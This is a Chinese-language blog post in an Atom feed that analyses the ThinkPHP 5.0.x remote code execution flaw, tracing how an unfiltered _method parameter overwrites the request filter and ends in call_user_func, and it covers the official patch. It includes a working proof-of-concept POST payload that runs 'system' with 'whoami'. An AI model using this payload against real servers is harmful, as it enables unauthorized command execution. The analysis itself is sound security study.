    <content type="html"><![CDATA[<h1 id="ThinkPHP5-0-0-5-0-23RCE漏洞分析"><a href="#ThinkPHP5-0-0-5-0-23RCE漏洞分析" class="headerlink" title="ThinkPHP5.0.0~5.0.23RCE漏洞分析"></a>ThinkPHP5.0.0~5.0.23RCE漏洞分析</h1><p>最近TP5一直在爆洞，既然浪潮在，就有必要跟进分析一下。但是由于自己对TP5框架流程不是很了解，所以有了这篇边摸索边分析的文章。</p><h1 id="TP5框架流程"><a href="#TP5框架流程" class="headerlink" title="TP5框架流程"></a>TP5框架流程</h1><p>应用启动在App.php的run()函数，说一下自己对这个框架的大致理解</p><p><strong>用户请求 -&gt; 路由解析 -&gt; 调度请求 -&gt; 执行操作 -&gt; 响应输出</strong></p><p><img src="https://i.loli.net/2019/01/20/5c43f7bb2d673.png" alt></p><p>App.php代码部分流程如下：  (自己的理解，可能有不对的地方，望斧正<br>1、应用初始化<code>initModule()</code><br>2、run()-&gt;routeCheck()对用户的get请求进行路由检测<br>3、若注册了路由则返回相应的调度值，若路由检测无效(即没有注册路由)则返回调度值为module<br>4、根据调度值，处理不同请求</p><pre><code>switch (self::$dispatch[&#39;type&#39;]) {    case &#39;redirect&#39;:        header(&#39;Location: &#39; . self::$dispatch[&#39;url&#39;], true, self::$dispatch[&#39;status&#39;]);        break;    case &#39;module&#39;:       $data = self::module(self::$dispatch[&#39;module&#39;], $config);        break;    case &#39;controller&#39;:        $data = Loader::action(self::$dispatch[&#39;controller&#39;], self::$dispatch[&#39;params&#39;]);        break;    case &#39;method&#39;:        $data = self::invokeMethod(self::$dispatch[&#39;method&#39;], self::$dispatch[&#39;params&#39;]);        break;    case &#39;function&#39;:        $data = self::invokeFunction(self::$dispatch[&#39;function&#39;], self::$dispatch[&#39;params&#39;]);        break;    default:        throw new Exception(&#39;dispatch type not support&#39;, 10008);}</code></pre><p>5、执行处理，返回输出。</p><p>TP5中get的路由请求参数为s。若get请求时s参数不存在，则调度类型默认值为module，调度方法实现<code>self::module()</code>，即进入MVC的处理方式：Controller层调用Module处理数据返回给View到用户。</p><p>所以核心操作就是调度请求。</p><h1 id="回到正题"><a href="#回到正题" class="headerlink" title="回到正题"></a>回到正题</h1><p>这个漏洞的产生是因为对_method参数过滤不严导致$filter变量覆盖</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code>http://127.0.0.1/thinkphp/thinkphp_5.0.22_with_extend/public/index.php?s=captchaPOST:_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>App.php部分代码：</p><pre><code>&lt;?php/*** 执行应用程序* @access public* @param  Request $request 请求对象* @return Response* @throws Exception*/public static function run(Request $request = null){    $request = is_null($request) ? Request::instance() : $request;    try {        ...        // 获取应用调度信息        $dispatch = self::$dispatch;        // 未设置调度信息则进行 URL 路由检测        if (empty($dispatch)) {            $dispatch = self::routeCheck($request, $config);        }        ...        $data = self::exec($dispatch, $config);    } catch (HttpResponseException $exception) {        ...    }    ...}</code></pre><p>看到<code>$dispatch = self::routeCheck($request, $config)</code>，$request是http请求对象，通过调用Request类中的method方法来获取当前的http请求类型，该函数的实现在<code>thinkphp/library/think/Request.php:512</code></p><pre><code>&lt;?php/**    * 当前的请求类型    * @access public    * @param bool $method  true 获取原始请求类型    * @return string    */public function method($method = false){    if (true === $method) {        // 获取原始请求类型        return $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;    } elseif (!$this-&gt;method) {        if (isset($_POST[Config::get(&#39;var_method&#39;)])) {            $this-&gt;method = strtoupper($_POST[Config::get(&#39;var_method&#39;)]);            $this-&gt;{$this-&gt;method}($_POST);        } elseif (isset($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;])) {            $this-&gt;method = strtoupper($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;]);        } else {            $this-&gt;method = $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;        }    }    return $this-&gt;method;}</code></pre><p>var_method的伪装变量值为_method<br><img src="https://i.loli.net/2019/01/20/5c43fee616aac.png" alt></p><p>因此通过POST一个_method参数，即可进入判断，并执行<code>$this-&gt;{$this-&gt;method}($_POST)</code>语句。因此通过指定_method即可完成对该类的任意方法的调用，其传入对应的参数即对应的$_POST数组。在poc里看到传入的<strong>method为</strong>construct，代码如下</p><pre><code>&lt;?phpprotected function __construct($options = []){    foreach ($options as $name =&gt; $item) {        if (property_exists($this, $name)) {            $this-&gt;$name = $item;        }    }    if (is_null($this-&gt;filter)) {        $this-&gt;filter = Config::get(&#39;default_filter&#39;);    }    // 保存 php://input    $this-&gt;input = file_get_contents(&#39;php://input&#39;);}</code></pre><p>利用foreach循环，和POST传入数组即可对Request对象的成员属性进行覆盖。经过覆盖后的结果<br><img src="https://i.loli.net/2019/01/20/5c43f8a3b1ee9.png" alt></p><p>这里也就解释了poc中为什么要传入method=get。为了使$this-&gt;method=get才能对应上面Request.php的method()方法返回值，否则程序报错</p><p>request对象差不多清楚了，跟进self::routeCheck()</p><pre><code>&lt;?php/** * URL路由检测（根据PATH_INFO) * @access public * @param  \think\Request $request 请求实例 * @param  array          $config  配置信息 * @return array * @throws \think\Exception */public static function routeCheck($request, array $config){    $path   = $request-&gt;path();  //path=captcha    $depr   = $config[&#39;pathinfo_depr&#39;];    $result = false;    // 路由检测（根据路由定义返回不同的URL调度）    $result = Route::check($request, $path, $depr, $config[&#39;url_domain_deploy&#39;]);    return $result;</code></pre><p>根据$request的get请求进行路由检测，在vendor/topthink/think-captcha/src/helper.php中captcha注册了路由，因此其对应的URL调度值为method<br><img src="https://i.loli.net/2019/01/20/5c43feb394e5f.png" alt></p><p>再返回App.php继续执行<code>$data = self::exec($dispatch, $config);</code></p><pre><code>&lt;?phpprotected static function exec($dispatch, $config){    switch ($dispatch[&#39;type&#39;]) {        ...        case &#39;method&#39;: // 回调方法            $vars = array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);            $data = self::invokeMethod($dispatch[&#39;method&#39;], $vars);            break;        ...    }    return $data;}</code></pre><p>介绍的，根据调度值的不同处理不同请求，此时我们的dispatch为method。继续跟进<code>Request::instance()-&gt;param()</code></p><pre><code>&lt;?phppublic function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;){    if (empty($this-&gt;mergeParam)) {        $method = $this-&gt;method(true);        ...    }    ...    // 当前请求参数和URL地址中的参数合并    $this-&gt;param      = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));    $this-&gt;mergeParam = true;    ...    return $this-&gt;input($this-&gt;param, $name, $default, $filter);}</code></pre><p>array_merge用来合并参数，此时$this-&gt;param为一个数组，且第一个值为我们刚才覆盖的get值<br><img src="https://i.loli.net/2019/01/20/5c43f82e8ae5b.png" alt></p><p>继续跟进<code>$this-&gt;input($this-&gt;param, $name, $default, $filter)</code></p><pre><code>&lt;?phppublic function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;){    ...    // 解析过滤器    $filter = $this-&gt;getFilter($filter, $default);    if (is_array($data)) {        array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);        reset($data);    }    ...}</code></pre><p>跟进getFilter</p><pre><code>protected function getFilter($filter, $default){    if (is_null($filter)) {        $filter = [];    } else {        $filter = $filter ?: $this-&gt;filter;        if (is_string($filter) &amp;&amp; false === strpos($filter, &#39;/&#39;)) {            $filter = explode(&#39;,&#39;, $filter);        } else {            $filter = (array) $filter;        }    }    $filter[] = $default;    return $filter;}</code></pre><p>到这逻辑就很清楚了，在input函数里面获得$filter值为我们之前覆盖的$this-&gt;filter，$data是实参传入的$this-&gt;param数组，接着调用 array_walk_recursive()进行自定义函数处理，函数名为filterValue()<br><img src="https://i.loli.net/2019/01/20/5c43f84376fdb.png" alt></p><p>从而调用call_user_func进行RCE</p><h1 id="官方补丁"><a href="#官方补丁" class="headerlink" title="官方补丁"></a>官方补丁</h1><p>看一下diff<br><img src="https://i.loli.net/2019/01/20/5c43f86c5eec1.png" alt></p><p>触发漏洞点就是method可控，进而调用任意函数。补丁对参数method进行了白名单</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://xz.aliyun.com/t/3845#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845#toc-1</a></li><li><a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003</a></li><li><a href="https://www.kancloud.cn/zmwtp/tp5/119426" target="_blank" rel="noopener">https://www.kancloud.cn/zmwtp/tp5/119426</a></li><li><a href="https://www.kancloud.cn/zmwtp/tp5/119428" target="_blank" rel="noopener">https://www.kancloud.cn/zmwtp/tp5/119428</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ThinkPHP5-0-0-5-0-23RCE漏洞分析&quot;&gt;&lt;a href=&quot;#ThinkPHP5-0-0-5-0-23RCE漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;ThinkPHP5.0.0~5.0.23RCE漏洞分析&quot;&gt;&lt;/a&gt;Think
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://hpdoger.cn/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
</feed>
